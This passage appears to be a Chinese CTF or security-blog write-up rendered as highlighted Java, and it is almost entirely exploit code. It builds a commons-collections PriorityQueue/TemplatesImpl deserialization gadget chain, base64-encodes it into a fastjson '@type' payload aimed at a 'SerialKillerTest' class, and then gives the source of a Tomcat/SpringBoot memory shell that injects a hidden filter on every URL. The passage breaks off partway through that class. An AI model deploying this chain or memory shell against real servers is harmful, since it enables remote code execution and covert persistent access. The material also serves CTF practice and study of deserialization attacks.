+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        TransformingComparator comparator<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> TransformingComparator<span style="color:#ff79c6">(</span>invokerTransformer<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        PriorityQueue queue<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> PriorityQueue<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//让size=2
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>3<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>4<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        反射，强行往queue塞rmiConnector
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class queueClass<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Field queueField<span style="color:#ff79c6">=</span>queueClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;queue&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>rmiConnector<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//反射强写comparator
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class clazz<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Field comparatorField<span style="color:#ff79c6">=</span>clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;comparator&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span> comparator<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        String base<span style="color:#ff79c6">=</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        System.out.println(base);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        ParserConfig<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getGlobalInstance</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">setAutoTypeSupport</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String str<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;{\n&#34;</span> <span style="color:#ff79c6">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;  \&#34;@type\&#34;: \&#34;com.ciscn.SerialKillerTest\&#34;,\n&#34;</span> <span style="color:#ff79c6">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;  \&#34;serialBytes\&#34;:\&#34;&#34;</span><span style="color:#ff79c6">+</span>base<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;\&#34;}    &#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>str<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        JSON.parseObject(str);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> PriorityQueue <span style="color:#50fa7b">getPriorityQueueExp</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>memoryshell<span style="color:#ff79c6">.</span><span style="color:#50fa7b">InjectTomcat01</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()});</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;EvilTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span> setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//制作transformer
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        InvokerTransformer transformer<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> InvokerTransformer<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;newTransformer&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[]{},</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{});</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//接下来只需调用transformer.transform(templatesImpl)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//        transformer.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        TransformingComparator comparator<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> TransformingComparator<span style="color:#ff79c6">(</span>transformer<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        PriorityQueue queue<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> PriorityQueue<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//让size=2
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>3<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>4<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        反射，强行往queue塞templatesImpl
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class queueClass<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Field queueField<span style="color:#ff79c6">=</span>queueClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;queue&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>templates<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//反射强写comparator
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class clazz<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Field comparatorField<span style="color:#ff79c6">=</span>clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;comparator&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span> comparator<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> queue<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String fieldName<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span>
+</span></span><span style="display:flex;"><span>            Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>fieldName<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            ByteArrayInputStream ais <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>ais<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>Object o<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            ByteArrayOutputStream aos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>aos<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> aos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>内存马</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">目前测试springboot可用的内存马
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> memoryshell<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.catalina.LifecycleState<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.catalina.core.StandardContext<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.catalina.loader.WebappClassLoaderBase<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.tomcat.util.descriptor.web.FilterMap<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.servlet.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.BufferedReader<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.InputStreamReader<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Method<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.charset.StandardCharsets<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">InjectTomcat01</span> <span style="color:#8be9fd;font-style:italic">extends</span> AbstractTranslet <span style="color:#8be9fd;font-style:italic">implements</span> Filter<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String filterName <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;k&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String param <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;bridge_is_noob&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String filterUrlPattern <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/*&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span><span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            WebappClassLoaderBase webappClassLoaderBase <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>WebappClassLoaderBase<span style="color:#ff79c6">)</span> Thread<span style="color:#ff79c6">.</span><span style="color:#50fa7b">currentThread</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContextClassLoader</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            StandardContext standardContext <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>StandardContext<span style="color:#ff79c6">)</span> webappClassLoaderBase<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getResources</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContext</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            ServletContext servletContext <span style="color:#ff79c6">=</span> standardContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getServletContext</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            Field filterConfigs <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.core.StandardContext&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;filterConfigs&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            filterConfigs<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            Map map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Map<span style="color:#ff79c6">)</span> filterConfigs<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>filterName<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> standardContext <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>                Field stateField <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.util.LifecycleBase&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;state&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>                stateField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>                stateField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">,</span> LifecycleState<span style="color:#ff79c6">.</span><span style="color:#50fa7b">STARTING_PREP</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>                FilterRegistration<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Dynamic</span> filter <span style="color:#ff79c6">=</span> servletContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addFilter</span><span style="color:#ff79c6">(</span>filterName<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> InjectTomcat01<span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>                filter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addMappingForUrlPatterns</span><span style="color:#ff79c6">(</span>java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">util</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">EnumSet</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">of</span><span style="color:#ff79c6">(</span>DispatcherType<span style="color:#ff79c6">.</span><span style="color:#50fa7b">REQUEST</span><span style="color:#ff79c6">),</span><span style="color:#ff79c6">false</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span>filterUrlPattern<span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>                Method filterStart <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.core.StandardContext&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;filterStart&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>                filterStart<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>                FilterMap<span style="color:#ff79c6">[]</span> filterMaps <span style="color:#ff79c6">=</span> standardContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">findFilterMaps</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0 <span style="color:#ff79c6">;</span> i <span style="color:#ff79c6">&lt;</span> filterMaps<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++){</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>filterMaps<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">].</span><span style="color:#50fa7b">getFilterName</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">equalsIgnoreCase</span><span style="color:#ff79c6">(</span>filterName<span style="color:#ff79c6">)){</span>
+</span></span><span style="display:flex;"><span>                        FilterMap filterMap <span style="color:#ff79c6">=</span> filterMaps<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">];</span>
+</span></span><span style="display:flex;"><span>                        filterMaps<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> filterMaps<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">];</span>
+</span></span><span style="display:flex;"><span>                        filterMaps<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> filterMap<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>                stateField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">,</span>LifecycleState<span style="color:#ff79c6">.</span><span style="color:#50fa7b">STARTED</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span><span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">){}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xalan</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xsltc</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">DOM</span> document<span style="color:#ff79c6">,</span> SerializationHandler<span style="color:#ff79c6">[]</span> handlers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
